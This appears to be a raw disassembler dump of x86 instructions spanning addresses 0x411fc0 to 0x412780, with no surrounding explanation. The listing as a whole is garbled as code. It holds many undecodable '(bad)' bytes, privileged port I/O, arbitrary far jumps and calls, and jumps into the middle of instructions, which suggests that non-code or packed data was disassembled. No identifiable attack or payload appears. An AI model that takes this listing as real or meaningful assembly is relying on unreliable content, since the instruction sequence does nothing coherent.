  411fc0:	scas   eax,DWORD PTR es:[edi]
  411fc1:	mov    bh,0x24
  411fc3:	jno    0x411fe5
  411fc5:	cdq    
  411fc6:	jo     0x412019
  411fc8:	pushf  
  411fc9:	sub    bh,ah
  411fcb:	stos   BYTE PTR es:[edi],al
  411fcc:	mov    DWORD PTR [edx],esi
  411fce:	dec    edi
  411fcf:	push   ecx
  411fd0:	aaa    
  411fd1:	and    BYTE PTR [ebx-0x73],dl
  411fd4:	xor    al,0xf7
  411fd6:	pop    es
  411fd7:	adc    esi,edx
  411fd9:	adc    BYTE PTR [ebx],cl
  411fdb:	mov    BYTE PTR [ecx+0x1f27922c],dh
  411fe1:	push   cs
  411fe2:	dec    DWORD PTR [ebx-0x17]
  411fe5:	bound  esi,QWORD PTR [ecx*2-0x6461d519]
  411fec:	cmp    ecx,DWORD PTR [edi]
  411fee:	(bad)  
  411ff0:	mov    cl,0xc3
  411ff2:	in     eax,dx
  411ff3:	adc    esi,DWORD PTR [eax+0x52]
  411ff6:	(bad)  
  411ff7:	int    0x8f
  411ff9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411ffa:	jmp    0x411fa5
  411ffc:	push   ecx
  411ffd:	cmp    DWORD PTR [esi],ebx
  411fff:	mov    ecx,0x99a16239
  412004:	mov    edi,0x2d660e0d
  412009:	sub    eax,0xcf65ddfa
  41200e:	dec    esp
  41200f:	push   cs
  412010:	push   es
  412011:	cmp    eax,0xf5b58527
  412016:	mov    BYTE PTR [edi+0xd0701c2],cl
  41201c:	idiv   DWORD PTR [ebp+0x538a41e9]
  412022:	icebp  
  412023:	or     eax,0x46c13832
  412028:	xchg   esp,eax
  412029:	jb     0x41203a
  41202b:	or     al,0x28
  41202d:	retf   
  41202e:	mov    esp,0x36e3b08a
  412033:	jae    0x411fd6
  412035:	retf   0x1246
  412038:	scas   al,BYTE PTR es:[edi]
  412039:	out    dx,al
  41203a:	xchg   DWORD PTR [ecx+eax*4],eax
  41203d:	sbb    eax,DWORD PTR [esi]
  41203f:	loopne 0x412058
  412041:	cmp    eax,0x42c51275
  412046:	or     bl,BYTE PTR [edx-0x23a8b368]
  41204c:	mov    ?,esp
  41204e:	add    bl,al
  412050:	jo     0x411ff1
  412052:	mov    bl,0xf4
  412054:	cmp    al,0xec
  412056:	and    DWORD PTR [esi+0x49a554bf],0x2d
  41205d:	sbb    cl,BYTE PTR [eax]
  41205f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412060:	sub    ah,cl
  412062:	jecxz  0x4120df
  412064:	repz pop ebp
  412066:	xchg   ebp,eax
  412067:	push   ss
  412068:	pop    ebp
  412069:	outs   dx,BYTE PTR ds:[esi]
  41206a:	lea    esp,[edx+0x26]
  41206d:	out    dx,al
  41206e:	repnz (bad)
  412071:	adc    eax,0x3779c39e
  412076:	ins    DWORD PTR es:[edi],dx
  412077:	dec    esi
  412078:	pop    ss
  412079:	add    eax,0xbec3edaa
  41207e:	pushw  0x59
  412081:	mov    ds:0x744ed9a2,eax
  412086:	mov    ah,0xb1
  412088:	jp     0x4120de
  41208a:	mov    cl,BYTE PTR [edx+eax*4-0x20]
  41208e:	push   ss
  41208f:	xchg   DWORD PTR [ecx+ebx*2-0x4173f3ce],esp
  412096:	retf   
  412097:	sub    eax,0xbe77955e
  41209c:	shl    DWORD PTR [edi+0x5472104d],cl
  4120a2:	dec    esi
  4120a3:	jecxz  0x412076
  4120a5:	pop    DWORD PTR [edx]
  4120a7:	dec    ebx
  4120a8:	mov    esi,0xfbb8535d
  4120ad:	sub    DWORD PTR [ecx-0xd],0xafba66ed
  4120b4:	xor    ch,ah
  4120b6:	pop    edi
  4120b7:	pop    esi
  4120b8:	pop    eax
  4120b9:	mov    cl,0xea
  4120bb:	dec    eax
  4120bc:	sti    
  4120bd:	mov    ds:0xdd8e109e,eax
  4120c2:	loopne 0x412142
  4120c4:	pushf  
  4120c5:	inc    edi
  4120c6:	imul   esi,DWORD PTR [edx-0x74],0x1e294532
  4120cd:	clc    
  4120ce:	adc    ebp,DWORD PTR [eax+0x4e]
  4120d1:	in     eax,0xf4
  4120d3:	lea    esp,[ebx+0x38]
  4120d6:	xor    ch,BYTE PTR [ebx+ebx*2+0x1b]
  4120da:	mov    cl,BYTE PTR [esi+0x63]
  4120dd:	mov    edi,0x482dfe08
  4120e2:	mov    esi,0xd195434
  4120e7:	sbb    BYTE PTR [edi+0x3a],dl
  4120ea:	jp     0x4120a6
  4120ec:	inc    esp
  4120ed:	ret    0xf2c8
  4120f0:	mov    cl,0x87
  4120f3:	dec    esi
  4120f4:	sbb    edx,DWORD PTR [ebx+0x21]
  4120f7:	mov    ebp,DWORD PTR [ecx+0x3a]
  4120fa:	retf   0x53e2
  4120fd:	jnp    0x412093
  4120ff:	mov    dh,0x9c
  412101:	out    dx,eax
  412102:	in     ax,dx
  412104:	lock cmp esp,DWORD PTR [ecx-0x54]
  412108:	out    dx,eax
  412109:	in     eax,0xae
  41210b:	imul   esi,DWORD PTR [edi+0x3fbe5b2f],0xfc0c4a9f
  412115:	mov    eax,ds:0xb86cfc59
  41211a:	inc    ebx
  41211b:	sbb    DWORD PTR [ebp-0x58546541],0x19e70bb2
  412125:	cmp    al,0xb4
  412127:	stos   BYTE PTR es:[edi],al
  412128:	push   ecx
  412129:	dec    ebx
  41212a:	ds dec esi
  41212c:	xchg   DWORD PTR [ebx-0x62],eax
  41212f:	(bad)  
  412130:	jmp    DWORD PTR [eax-0x70fa9d45]
  412136:	stos   DWORD PTR es:[edi],eax
  412137:	bound  esi,QWORD PTR [edi-0x5d426a28]
  41213d:	add    BYTE PTR [esi+0x3aaec9cd],dl
  412143:	aaa    
  412144:	or     al,0xfe
  412146:	sar    eax,cl
  412148:	in     al,0x5b
  41214a:	cs sbb al,0xfe
  41214d:	mov    ds:0xf9e3ff81,eax
  412152:	xor    al,0x1b
  412154:	test   BYTE PTR [esi],0x81
  412157:	fnstenv [ebx]
  412159:	xchg   edx,eax
  41215a:	or     edx,ebx
  41215c:	jne    0x4121cf
  41215e:	push   es
  41215f:	popa   
  412160:	repnz xchg ebp,eax
  412162:	inc    ecx
  412163:	cmp    edi,DWORD PTR [edi+0x22]
  412166:	int    0xf5
  412168:	ins    DWORD PTR es:[edi],dx
  412169:	add    BYTE PTR [edi-0x6af5b83d],dh
  41216f:	inc    eax
  412170:	sub    al,0xdc
  412172:	(bad)  
  412173:	ficomp DWORD PTR [ecx-0x1b]
  412176:	scas   eax,DWORD PTR es:[edi]
  412177:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412178:	test   BYTE PTR [eax+esi*4+0x1b],ch
  41217c:	jg     0x41218b
  41217e:	dec    esi
  41217f:	push   eax
  412180:	mov    ch,0x2e
  412182:	pop    ebp
  412183:	(bad)  
  412184:	out    dx,eax
  412185:	mov    bl,0xd8
  412187:	xchg   ebp,eax
  412188:	sar    edi,1
  41218a:	push   esp
  41218b:	pop    ss
  41218c:	popa   
  41218d:	arpl   WORD PTR [eax-0x1081e399],sp
  412193:	push   cs
  412194:	xchg   ebx,eax
  412195:	out    dx,eax
  412196:	aad    0x22
  412198:	sub    edi,DWORD PTR [ecx+edx*8]
  41219b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41219c:	test   BYTE PTR [ebp-0x7c],bl
  41219f:	push   esp
  4121a0:	sub    eax,0x11fd1524
  4121a5:	sbb    al,0x83
  4121a7:	add    ebx,esi
  4121a9:	scas   eax,DWORD PTR es:[edi]
  4121aa:	loop   0x4121f6
  4121ac:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4121ae:	icebp  
  4121af:	(bad)  
  4121b0:	mov    eax,ds:0x9689d4d7
  4121b5:	int3   
  4121b6:	push   ecx
  4121b7:	mov    edx,0x34002bf0
  4121bc:	cld    
  4121bd:	push   edi
  4121be:	mov    ch,0xd9
  4121c0:	es inc ecx
  4121c2:	fild   WORD PTR [esi-0x202623cd]
  4121c8:	sti    
  4121c9:	test   DWORD PTR [ebp-0x1712605a],edx
  4121cf:	xor    edx,DWORD PTR [ecx-0x251b200]
  4121d5:	(bad)  
  4121d6:	jbe    0x412187
  4121d8:	xchg   esi,eax
  4121d9:	jae    0x4121a2
  4121db:	inc    dx
  4121dd:	nop
  4121de:	jmp    0x86ea:0xcd382ee9
  4121e5:	push   edx
  4121e6:	sbb    DWORD PTR [edi-0x25],0x3a
  4121ea:	inc    ecx
  4121eb:	stos   DWORD PTR es:[edi],eax
  4121ec:	xor    dh,BYTE PTR [edi]
  4121ee:	test   al,0xe7
  4121f0:	sub    ecx,DWORD PTR [ebx]
  4121f2:	cmp    eax,0x4b20194e
  4121f7:	mov    bh,0x93
  4121f9:	or     eax,0x6a38ccde
  4121fe:	lock jmp 0x4121d7
  412201:	or     bh,BYTE PTR [esi-0x58]
  412204:	push   esi
  412205:	mov    ?,WORD PTR [ebx+edx*2]
  412208:	neg    DWORD PTR ds:0xab98fb48
  41220e:	and    BYTE PTR [eax-0xd],dl
  412211:	imul   eax,edx,0x1edd6131
  412217:	loop   0x41221f
  412219:	xor    DWORD PTR [bx+di],0x2f232084
  412220:	mov    ch,BYTE PTR [eax-0x56ada75d]
  412226:	iret   
  412227:	pop    ecx
  412228:	xchg   ecx,eax
  412229:	mov    ecx,0xc51b3951
  41222e:	push   edx
  41222f:	pop    edi
  412230:	pop    esp
  412231:	test   DWORD PTR [eax+0xd7715ab],0xe6929803
  41223b:	aam    0xa7
  41223d:	out    dx,eax
  41223e:	test   DWORD PTR [edi],esi
  412240:	push   ss
  412241:	push   cs
  412242:	jp     0x4121ea
  412244:	jmp    0x4121cb
  412246:	mov    ecx,0x763ef3d6
  41224b:	dec    ebp
  41224c:	add    DWORD PTR [ecx+0x29],esp
  41224f:	fist   DWORD PTR [eax]
  412251:	inc    BYTE PTR [edi+0x284c8be2]
  412257:	inc    esi
  412258:	xchg   esp,eax
  412259:	sbb    BYTE PTR [esi+0x6d],dl
  41225c:	add    bl,cl
  41225e:	jnp    0x41229b
  412260:	(bad)  
  412261:	out    0xa7,eax
  412263:	sbb    BYTE PTR [ecx],dh
  412265:	leave  
  412266:	clc    
  412267:	sbb    edi,DWORD PTR [esi+edx*4+0x7]
  41226b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41226c:	lds    ebp,FWORD PTR [edx+0x9]
  41226f:	jno    0x4122bb
  412271:	jno    0x41221a
  412273:	mov    edx,0x560e787e
  412278:	pop    esi
  412279:	and    esp,DWORD PTR [eiz*1-0x588e373f]
  412280:	cli    
  412281:	cmc    
  412282:	sub    ebp,DWORD PTR [ebx]
  412284:	xor    DWORD PTR [eax+0x49],esp
  412287:	push   ds
  412288:	lock dec esi
  41228a:	aam    0x6d
  41228c:	push   es
  41228d:	ror    esi,cl
  41228f:	out    0xf0,eax
  412291:	js     0x412236
  412293:	jbe    0x41224f
  412295:	cmp    DWORD PTR [ecx-0x631454f5],ebx
  41229b:	mov    dh,0xa6
  41229d:	xlat   BYTE PTR ds:[ebx]
  41229e:	pop    eax
  41229f:	imul   edx,DWORD PTR [esi],0x84b7a62b
  4122a5:	mov    ebp,0x11c89b89
  4122aa:	pop    es
  4122ab:	or     DWORD PTR [eax],edx
  4122ad:	adc    DWORD PTR [ecx+eiz*8+0x30d634dc],0x6d
  4122b5:	mov    bh,0x3c
  4122b7:	aas    
  4122b8:	xor    ebx,edx
  4122ba:	add    cl,BYTE PTR [ebx-0x5]
  4122bd:	cs mov dl,0x59
  4122c0:	ret    0xd853
  4122c3:	or     DWORD PTR [edi],edi
  4122c5:	(bad)  
  4122c6:	pop    ds
  4122c7:	push   es
  4122c8:	arpl   si,bx
  4122ca:	mov    ecx,0x43a4f37d
  4122cf:	mov    ds:0xec242ef6,eax
  4122d4:	push   ds
  4122d5:	and    DWORD PTR fs:[ecx-0x6f],eax
  4122d9:	std    
  4122da:	jl     0x412303
  4122dc:	ins    BYTE PTR es:[edi],dx
  4122dd:	neg    BYTE PTR [edx-0x174d209e]
  4122e3:	sbb    BYTE PTR [ecx],bl
  4122e5:	scas   eax,DWORD PTR es:[edi]
  4122e6:	dec    eax
  4122e7:	sahf   
  4122e8:	push   es
  4122e9:	int    0x81
  4122eb:	std    
  4122ec:	pushf  
  4122ed:	mov    edi,0xb15fdef9
  4122f2:	mul    BYTE PTR [ecx]
  4122f4:	hlt    
  4122f5:	imul   ebx,DWORD PTR [esi+0x23],0xffffffa6
  4122f9:	push   ecx
  4122fa:	or     eax,0xb43d447a
  4122ff:	xchg   BYTE PTR [eax],cl
  412301:	push   ds
  412302:	dec    eax
  412303:	retf   0xa13b
  412306:	sbb    BYTE PTR [esp+edx*8-0x80],bh
  41230a:	in     al,0x59
  41230c:	fist   WORD PTR [edi+0x20]
  41230f:	pop    ebp
  412310:	aam    0x36
  412312:	(bad)  
  412313:	popf   
  412314:	sub    bl,BYTE PTR [ebx-0x25]
  412317:	adc    eax,0xf108a395
  41231c:	popa   
  41231d:	int    0x6e
  41231f:	mov    edx,0x2433f5b6
  412324:	je     0x412323
  412326:	sub    BYTE PTR [esp+eax*8],dl
  412329:	inc    ebp
  41232a:	das    
  41232b:	adc    dh,BYTE PTR es:[eax+0x77632fd2]
  412332:	cli    
  412333:	push   ecx
  412334:	mov    esp,0x3e220ade
  412339:	retf   
  41233a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41233b:	xor    al,0xea
  41233d:	sti    
  41233e:	inc    esi
  41233f:	adc    BYTE PTR [ebp+0x443b5c37],ah
  412345:	shr    edx,cl
  412347:	pop    eax
  412348:	xchg   ecx,eax
  412349:	sbb    esi,edx
  41234b:	xor    dl,BYTE PTR [edi+0x60]
  41234e:	add    DWORD PTR [ecx+edx*8+0x5f784294],ecx
  412355:	inc    ebx
  412356:	or     eax,0x6b09734
  41235b:	cld    
  41235c:	xlat   BYTE PTR ds:[ebx]
  41235d:	sub    dl,dh
  41235f:	pop    esp
  412360:	and    BYTE PTR [edx+0x51],dl
  412363:	push   eax
  412364:	fcomp  QWORD PTR [ebp+0x4a]
  412367:	and    DWORD PTR [ecx+0x1],edx
  41236a:	add    al,0x5f
  41236c:	mov    bh,0xb0
  41236e:	mov    edi,0xb1b6ac62
  412373:	mov    ebx,0xe30e3757
  412378:	out    dx,eax
  412379:	int3   
  41237a:	mov    esp,0x1067356b
  41237f:	adc    ebx,0x1b824011
  412385:	ss popf 
  412387:	outs   dx,DWORD PTR ds:[esi]
  412388:	aaa    
  412389:	jecxz  0x41235b
  41238b:	or     edx,esi
  41238d:	jmp    0xb29b:0x6e71af5a
  412394:	out    0xc7,eax
  412396:	xor    eax,DWORD PTR [esi]
  412398:	bound  edx,QWORD PTR [edi]
  41239a:	xor    ah,BYTE PTR [eax]
  41239c:	mov    ebp,0xd443b534
  4123a1:	mov    bl,0xb5
  4123a3:	and    DWORD PTR [ebp-0x30eeee2c],esi
  4123a9:	outs   dx,BYTE PTR ds:[esi]
  4123aa:	dec    esp
  4123ab:	out    0x99,eax
  4123ad:	js     0x41241a
  4123af:	lahf   
  4123b0:	aad    0x41
  4123b2:	mov    cl,BYTE PTR [edx+0x13]
  4123b5:	push   ecx
  4123b6:	sbb    eax,0xe5d8becf
  4123bb:	mov    bl,0xcc
  4123bd:	and    BYTE PTR [ecx],cl
  4123bf:	ret    0xfea5
  4123c2:	sbb    bh,BYTE PTR [esi-0x4]
  4123c5:	pop    ecx
  4123c6:	cmp    al,0xff
  4123c8:	jnp    0x4123e9
  4123ca:	inc    edx
  4123cb:	leave  
  4123cc:	mov    esp,0xbb074c39
  4123d1:	xor    BYTE PTR [ebx],0x4
  4123d4:	test   BYTE PTR [ecx],0x79
  4123d7:	mov    ecx,0x908124a1
  4123dc:	retf   
  4123dd:	dec    ebx
  4123de:	jl     0x412368
  4123e0:	and    esp,DWORD PTR [eax]
  4123e2:	push   edi
  4123e3:	fild   WORD PTR [esi+ecx*8-0x2c]
  4123e7:	xor    al,0x4
  4123e9:	sbb    eax,0xc2e14097
  4123ee:	ror    ebx,1
  4123f0:	ja     0x4123c1
  4123f2:	addr16 clc 
  4123f4:	mov    edx,0x8965bd79
  4123f9:	sbb    ah,ah
  4123fb:	add    DWORD PTR [ebx],eax
  4123fd:	cmp    BYTE PTR [esp+ebp*1-0x2f],0xcf
  412402:	ret    0xe717
  412405:	inc    ebp
  412406:	push   ecx
  412407:	outs   dx,BYTE PTR ds:[esi]
  412408:	aad    0xb1
  41240a:	pusha  
  41240b:	arpl   WORD PTR [ecx-0x77cc0d08],ax
  412411:	mov    BYTE PTR [edi-0x6d],cl
  412414:	outs   dx,DWORD PTR ds:[esi]
  412415:	lock dec esp
  412417:	sub    DWORD PTR [ebp+eax*8-0x3fd8a782],esi
  41241e:	lods   al,BYTE PTR ds:[esi]
  41241f:	rcr    DWORD PTR [edi],cl
  412421:	scas   eax,DWORD PTR es:[edi]
  412422:	jno    0x412495
  412424:	not    al
  412426:	sub    eax,DWORD PTR [esi]
  412428:	sahf   
  412429:	jg     0x41244b
  41242b:	aam    0x93
  41242d:	xchg   ecx,eax
  41242e:	pop    ecx
  41242f:	int3   
  412430:	xor    DWORD PTR [ecx],esi
  412432:	and    dh,0x2a
  412435:	aam    0x4
  412437:	(bad)  
  412438:	cdq    
  412439:	mov    eax,ds:0x7c3d0212
  41243e:	stc    
  41243f:	ja     0x41241c
  412441:	shr    DWORD PTR [edx],0xcc
  412444:	jnp    0x412475
  412446:	and    bh,dl
  412448:	inc    esi
  412449:	loopne 0x4123e3
  41244b:	push   ebp
  41244c:	ds inc edi
  41244e:	pop    edx
  41244f:	pushf  
  412450:	es jge 0x41240d
  412453:	shl    BYTE PTR [edx],cl
  412455:	arpl   WORD PTR [ebx+0x2d],di
  412458:	jnp    0x412460
  41245a:	xchg   ecx,eax
  41245b:	inc    esi
  41245c:	call   0x7be777d8
  412461:	push   edi
  412462:	mov    BYTE PTR [esi-0x5aa6c49e],ch
  412468:	fst    QWORD PTR [eax]
  41246a:	xchg   ecx,eax
  41246b:	mov    edx,0xc935a5a1
  412470:	test   edx,0xb724baa6
  412476:	mov    edx,0x3acf0d40
  41247b:	fisub  WORD PTR [ebx*1-0xa347c3e]
  412482:	dec    edx
  412483:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412484:	add    esp,DWORD PTR [ebx+0x5f]
  412487:	jecxz  0x412431
  412489:	fbstp  TBYTE PTR [esi+0x5c]
  41248c:	or     DWORD PTR [eax+ebx*2],edx
  41248f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412490:	repz aas 
  412492:	jno    0x4124da
  412494:	and    eax,ebx
  412496:	(bad)  
  412497:	fidivr DWORD PTR [edi+0x193449ae]
  41249d:	shl    BYTE PTR [ecx+0x38fe974b],cl
  4124a3:	cmp    eax,0xdcdd191d
  4124a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4124a9:	inc    ebp
  4124aa:	imul   edi,eax,0xffffffd5
  4124ad:	dec    ebx
  4124ae:	jne    0x4124ba
  4124b0:	daa    
  4124b1:	pop    eax
  4124b2:	mov    bl,0xa9
  4124b4:	pop    eax
  4124b5:	jmp    0xf2487bb4
  4124ba:	and    BYTE PTR [esp+edi*8+0x69cbf133],al
  4124c1:	loop   0x4124d9
  4124c3:	stc    
  4124c4:	mov    ?,WORD PTR [edi+eiz*1+0x7e]
  4124c8:	push   0x61ba6b34
  4124cd:	fs push ss
  4124cf:	dec    edi
  4124d0:	ret    0x3777
  4124d3:	nop
  4124d4:	inc    DWORD PTR [esi]
  4124d6:	inc    esi
  4124d7:	in     al,0x16
  4124d9:	mov    al,BYTE PTR [esi]
  4124db:	push   0x829833ce
  4124e0:	sub    al,cl
  4124e2:	or     BYTE PTR [esi-0x6d],0x16
  4124e6:	jmp    0x41248e
  4124e8:	lods   eax,DWORD PTR ds:[esi]
  4124e9:	gs fs mov dl,0xa4
  4124ed:	cmp    edx,DWORD PTR ds:0xfb42a469
  4124f3:	ret    0x7d9
  4124f6:	aas    
  4124f7:	enter  0x27c4,0x1b
  4124fb:	and    edi,DWORD PTR [eax]
  4124fd:	cmp    ebp,DWORD PTR [edx+0xa]
  412500:	pusha  
  412501:	inc    ebx
  412502:	sbb    al,0xbc
  412504:	sub    esp,ebp
  412506:	mov    ebx,0x28d1db29
  41250b:	cld    
  41250c:	arpl   WORD PTR [ecx+0xbceb4a7],si
  412512:	mov    edi,0x72d2dd93
  412517:	hlt    
  412518:	mov    ah,0x92
  41251a:	sub    eax,0xf48d20f
  41251f:	out    0xa4,eax
  412521:	xor    BYTE PTR [esi-0x1a8443bf],bl
  412527:	out    dx,eax
  412528:	pop    edi
  412529:	jmp    0x4125aa
  41252b:	fnstenv ds:0xf5ce2c8a
  412531:	cwde   
  412532:	mov    BYTE PTR [ecx+edx*4+0x13],bh
  412536:	(bad)  
  412537:	aaa    
  412538:	xor    dl,BYTE PTR gs:[edx+esi*2+0x592a9b49]
  412540:	mov    edi,DWORD PTR [eax+0x44]
  412543:	or     DWORD PTR [eax-0x18],edx
  412546:	dec    esp
  412547:	xor    ch,BYTE PTR [ebp+0x6]
  41254a:	add    al,0x2a
  41254c:	shr    BYTE PTR [eax+edi*2],1
  41254f:	sub    al,0x23
  412551:	adc    BYTE PTR [eax+0x7843e3d9],bh
  412557:	pop    ds
  412558:	xchg   ebx,eax
  412559:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41255a:	or     ch,BYTE PTR [ecx]
  41255c:	pop    eax
  41255d:	sar    esp,1
  41255f:	ret    0x95ad
  412562:	pusha  
  412563:	push   0x7115ac18
  412568:	cmp    al,0x66
  41256a:	ja     0x412500
  41256c:	call   0x8151b786
  412571:	mov    eax,0x9a90202b
  412576:	or     ecx,DWORD PTR [ebp+0x6c]
  412579:	ror    DWORD PTR [ebp+0x60],cl
  41257c:	dec    ecx
  41257d:	add    DWORD PTR [esi-0x4a],ebx
  412580:	lods   al,BYTE PTR ds:[esi]
  412581:	nop
  412582:	dec    ecx
  412583:	stos   BYTE PTR es:[edi],al
  412584:	std    
  412585:	sub    DWORD PTR [ebp-0x6368ef65],esp
  41258b:	pop    edi
  41258c:	push   ebx
  41258d:	inc    ebp
  41258e:	adc    DWORD PTR ds:0xff54e5eb,0xffffffa9
  412595:	fild   DWORD PTR [ebx-0x7d]
  412598:	aaa    
  412599:	sti    
  41259a:	jecxz  0x412615
  41259c:	mov    bl,dl
  41259e:	xchg   esi,eax
  41259f:	xchg   esp,eax
  4125a0:	add    eax,0x7dd03ba9
  4125a5:	lods   al,BYTE PTR ds:[esi]
  4125a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4125a7:	pop    ebp
  4125a8:	loopne 0x412581
  4125aa:	aad    0xf9
  4125ac:	cwde   
  4125ad:	xchg   ebx,eax
  4125ae:	mov    ebp,DWORD PTR [edx+0x6eebea17]
  4125b4:	outs   dx,DWORD PTR ds:[esi]
  4125b5:	add    eax,DWORD PTR [ecx-0x23]
  4125b8:	cs lock call 0x27da:0x340c7d22
  4125c1:	jb     0x4125ae
  4125c3:	sar    BYTE PTR [ebx+eiz*4+0x348e38a],1
  4125ca:	loopne 0x4125de
  4125cc:	sub    eax,0x6ec10cd0
  4125d1:	mov    fs,WORD PTR [esi-0x235f451]
  4125d7:	cli    
  4125d8:	stos   BYTE PTR es:[edi],al
  4125d9:	dec    edi
  4125da:	daa    
  4125db:	cmp    al,0x72
  4125dd:	lds    ebx,FWORD PTR [edx-0x33]
  4125e0:	mov    eax,0xebd9e047
  4125e5:	jnp    0x4125c8
  4125e7:	mov    dh,0xa8
  4125e9:	lahf   
  4125ea:	jae    0x4125fa
  4125ec:	add    cl,BYTE PTR [eax+0x5e5a6f37]
  4125f2:	aad    0xb3
  4125f4:	in     eax,dx
  4125f5:	test   DWORD PTR [edx-0x38d59b3],0xa5ceaad4
  4125ff:	daa    
  412600:	fninit 
  412602:	in     eax,dx
  412603:	call   0xa104be13
  412608:	adc    al,0xcc
  41260a:	sub    DWORD PTR [ebx],0xffffffbf
  41260d:	ins    BYTE PTR es:[edi],dx
  41260e:	cmc    
  41260f:	adc    edi,DWORD PTR [ebp+eax*8+0x762650fd]
  412616:	xor    al,0x75
  412618:	ss inc al
  41261b:	push   es
  41261c:	xor    BYTE PTR [ebp-0x6b],bh
  41261f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412620:	js     0x412607
  412622:	loopne 0x4125da
  412624:	enter  0x7ff4,0x1d
  412628:	push   0x59
  41262a:	out    dx,eax
  41262b:	(bad)  
  41262c:	xor    bl,BYTE PTR [edx-0x2]
  41262f:	sbb    eax,0xb423d3f4
  412634:	mov    ecx,0xabc0e40d
  412639:	or     DWORD PTR [ebp+eiz*1-0x2da8938d],esi
  412640:	mov    ebx,esp
  412642:	aad    0x38
  412644:	mov    ds:0x2786b814,eax
  412649:	inc    ebx
  41264a:	sub    edx,DWORD PTR [esi+edi*4]
  41264d:	shl    BYTE PTR [esi+ebp*2+0x9],0x44
  412652:	ins    DWORD PTR es:[edi],dx
  412653:	fild   DWORD PTR [ebx-0x2c]
  412656:	in     eax,0x6a
  412658:	adc    edi,edx
  41265a:	js     0x4126cc
  41265c:	outs   dx,DWORD PTR ds:[esi]
  41265d:	inc    esi
  41265e:	iret   
  41265f:	mov    cs:0x6a9cf128,eax
  412665:	sub    eax,0x2c9a22d1
  41266a:	dec    edi
  41266b:	aam    0x63
  41266d:	mov    bl,0x59
  41266f:	lea    ebx,[ebp-0x72d6baea]
  412675:	pop    eax
  412676:	xchg   DWORD PTR [ebx-0xdcc479a],eax
  41267c:	cmp    dl,BYTE PTR [esi]
  41267e:	inc    edi
  41267f:	sub    BYTE PTR [eax+0x3d],dh
  412682:	je     0x4126c6
  412684:	jbe    0x412682
  412686:	cwde   
  412687:	mov    dh,0xfb
  412689:	lock jb 0x412670
  41268c:	jp     0x4126ca
  41268e:	je     0x41269b
  412690:	dec    esi
  412692:	sbb    ah,ah
  412694:	jge    0x41268d
  412696:	push   0xd
  412698:	dec    ebp
  412699:	adc    BYTE PTR [eax-0x2a],dh
  41269c:	add    bl,bl
  41269e:	push   edx
  41269f:	pop    ss
  4126a0:	adc    ch,bh
  4126a2:	xor    ch,BYTE PTR [eax-0x42]
  4126a5:	(bad)  
  4126a6:	sub    ebp,DWORD PTR [esi-0x21]
  4126a9:	sbb    BYTE PTR ds:0x9e42b09e,al
  4126af:	lahf   
  4126b0:	popa   
  4126b1:	mov    dl,0xd1
  4126b3:	scas   eax,DWORD PTR es:[edi]
  4126b4:	dec    ebx
  4126b5:	outs   dx,BYTE PTR ds:[esi]
  4126b6:	sub    BYTE PTR [eax],cl
  4126b8:	mov    ds:0x794b6d89,al
  4126bd:	in     eax,0xcd
  4126bf:	mov    ch,0xab
  4126c1:	push   edi
  4126c2:	push   0xd9350777
  4126c7:	lahf   
  4126c8:	aas    
  4126c9:	jmp    0x89c4:0x4948348c
  4126d0:	inc    esi
  4126d1:	xchg   DWORD PTR [ebp-0x3d88d389],edi
  4126d7:	dec    ebp
  4126d8:	hlt    
  4126d9:	jb     0x41269d
  4126db:	mov    al,0xfd
  4126dd:	xor    eax,0xeac2c0
  4126e2:	scas   eax,DWORD PTR es:[edi]
  4126e3:	imul   esi,edi,0xffffffc1
  4126e6:	pop    ecx
  4126e7:	js     0x412673
  4126e9:	pop    edx
  4126ea:	div    BYTE PTR [esi+0x63]
  4126ed:	leave  
  4126ee:	loopne 0x41270a
  4126f0:	xchg   ecx,eax
  4126f1:	fs pop eax
  4126f3:	adc    eax,0xeccd41b9
  4126f8:	xchg   ecx,eax
  4126f9:	jecxz  0x412731
  4126fb:	test   DWORD PTR [edx-0x7bf8819c],eax
  412701:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412702:	icebp  
  412703:	js     0x412695
  412705:	clc    
  412706:	xor    al,BYTE PTR [eax+esi*4+0x4c]
  41270a:	or     bh,BYTE PTR [ebx+0x70b829b0]
  412710:	loope  0x41271c
  412712:	jle    0x412762
  412714:	je     0x412751
  412716:	cli    
  412717:	outs   dx,DWORD PTR ds:[esi]
  412718:	sbb    al,0x84
  41271a:	inc    edx
  41271b:	rcl    BYTE PTR [esi+0x76],0xa7
  41271f:	xchg   edi,eax
  412720:	fcomp  QWORD PTR [esi]
  412722:	test   esp,0xb3072137
  412728:	and    eax,0x506b019d
  41272d:	scas   eax,DWORD PTR es:[edi]
  41272e:	dec    eax
  412730:	and    BYTE PTR [edx-0x6f],0x3e
  412734:	adc    dh,BYTE PTR [ebx]
  412736:	pusha  
  412737:	call   0xdc:0xe9449793
  41273e:	into   
  41273f:	mov    bl,BYTE PTR [edi+edx*1]
  412742:	add    edx,DWORD PTR [ecx]
  412744:	call   0xbf86:0x19d70e56
  41274b:	pusha  
  41274c:	or     ch,BYTE PTR [ebp+edi*2-0x7d]
  412750:	inc    edi
  412751:	outs   dx,DWORD PTR ds:[esi]
  412752:	mov    bh,0x3
  412754:	mov    dh,0xf5
  412756:	inc    ebx
  412757:	bound  eax,QWORD PTR [ecx]
  412759:	das    
  41275a:	dec    ebx
  41275b:	inc    eax
  41275c:	retf   0xc83a
  41275f:	adc    eax,0xdfef8b76
  412764:	push   ds
  412765:	mov    esp,0xd8c32e6b
  41276a:	mov    ecx,0x249368d6
  41276f:	xchg   ecx,eax
  412770:	pop    ds
  412771:	push   ecx
  412772:	retf   
  412773:	cmp    dh,BYTE PTR [edx+ecx*4]
  412776:	pop    ebx
  412777:	dec    esi
  412778:	dec    edx
  412779:	rcl    DWORD PTR [esi-0x55d84ad6],1
  41277f:	sahf   
  412780:	pop    esp
